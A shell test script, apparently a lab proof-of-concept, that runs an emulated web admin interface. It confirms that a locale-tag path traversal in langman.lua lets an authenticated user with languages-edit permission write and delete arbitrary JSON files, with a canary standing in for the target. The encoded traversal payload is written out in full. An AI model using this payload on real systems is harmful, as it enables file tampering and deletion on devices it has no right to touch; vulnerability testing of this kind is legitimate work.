#!/bin/sh
set -eu

BASE=http://127.0.0.1:18082/cgi-bin
AUTH=
SERVER_PID=
CANARY=

cleanup() {
  set +e
  if [ -n "$CANARY" ]; then
    rm -f "$CANARY"
  fi
  if [ -n "$AUTH" ]; then
    rm -f "/dev/shm/usp_$AUTH"
    rm -rf "/opt/tmp/$AUTH"
  fi
  rm -rf /opt/setup/users/1 /opt/setup/profiles/7
  if [ -n "$SERVER_PID" ]; then
    kill "$SERVER_PID" 2>/dev/null
    wait "$SERVER_PID" 2>/dev/null
  fi
}
trap cleanup EXIT INT TERM

post() {
  /bin/busybox wget -qO- --post-data "$1" "$BASE/$2"
}

mkdir -p /opt/setup/users/1 /opt/setup/profiles/7
cp /lab/fixtures/restore-user-config.json /opt/setup/users/1/config.json
cp /lab/fixtures/restore-profile-config.json /opt/setup/profiles/7/config.json
cp /lab/fixtures/restore-profile-permissions.json /opt/setup/profiles/7/permissions.json
cp /lab/fixtures/restore-profile-layout.json /opt/setup/profiles/7/layout.json
touch /opt/setup/users/1/RestoreOnly /opt/setup/profiles/7/RestoreOnly
/usr/bin/qemu-i386 -L / /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf -D &
SERVER_PID=$!
for attempt in 1 2 3 4 5 6 7 8 9 10; do
  if /bin/busybox wget -qO- "$BASE/sysinfo.lua" >/dev/null; then
    break
  fi
  sleep 1
done

AUTH_RESPONSE=$(post 'action=authenticate&username=RestoreOnly&password=restoreprobe' api.lua)
case "$AUTH_RESPONSE" in
  *'"status":"ok"'*'"auth":"SSES'*) ;;
  *) echo "FAIL low-privilege authentication: $AUTH_RESPONSE"; exit 1;;
esac
AUTH=${AUTH_RESPONSE#*\"auth\":\"}
AUTH=${AUTH%%\"*}
mkdir -p "/opt/tmp/$AUTH"
CANARY="/opt/tmp/$AUTH/lwcanary.json"
TAG="..%2F..%2F..%2Fopt%2Ftmp%2F$AUTH%2Flwcanary"

DENIED=$(post "SSES=$AUTH&action=add&tag=$TAG&label=x&original_tag=en-GB" langman.lua) || true
case "$DENIED" in
  *'"error":"PERMISSION_DENIED"'*) ;;
  *) echo "FAIL languages-edit control: $DENIED"; exit 1;;
esac
[ ! -e "$CANARY" ] || { echo "FAIL denied locale wrote canary"; exit 1; }
echo "PASS languages-edit permission required"

printf '%s\n' '{"tools":{"languages-edit":1}}' > /opt/setup/profiles/7/permissions.json
rm -f "/dev/shm/usp_$AUTH"
rm -rf "/opt/tmp/$AUTH"
AUTH_RESPONSE=$(post 'action=authenticate&username=RestoreOnly&password=restoreprobe' api.lua)
case "$AUTH_RESPONSE" in
  *'"status":"ok"'*'"auth":"SSES'*) ;;
  *) echo "FAIL languages-edit authentication: $AUTH_RESPONSE"; exit 1;;
esac
AUTH=${AUTH_RESPONSE#*\"auth\":\"}
AUTH=${AUTH%%\"*}
mkdir -p "/opt/tmp/$AUTH"
CANARY="/opt/tmp/$AUTH/lwcanary.json"
TAG="..%2F..%2F..%2Fopt%2Ftmp%2F$AUTH%2Flwcanary"
WRITE=$(post "SSES=$AUTH&action=add&tag=$TAG&label=x&original_tag=en-GB" langman.lua) || true
case "$WRITE" in
  *'"status":"ok"'*) ;;
  *) echo "FAIL locale traversal write: $WRITE"; exit 1;;
esac
[ -f "$CANARY" ] || { echo "FAIL outside-locale canary missing"; exit 1; }
CONTENT=$(cat "$CANARY")
case "$CONTENT" in
  *'"label":"x"'*) ;;
  *) echo "FAIL unexpected canary content"; exit 1;;
esac
echo "PASS locale-tag traversal arbitrary JSON write"

REMOVE=$(post "SSES=$AUTH&action=remove&tag=$TAG" langman.lua) || true
case "$REMOVE" in
  *'"status":"ok"'*) ;;
  *) echo "FAIL locale traversal delete: $REMOVE"; exit 1;;
esac
[ ! -e "$CANARY" ] || { echo "FAIL outside-locale canary not deleted"; exit 1; }
echo "PASS locale-tag traversal arbitrary file delete"
echo "overall: PASS"
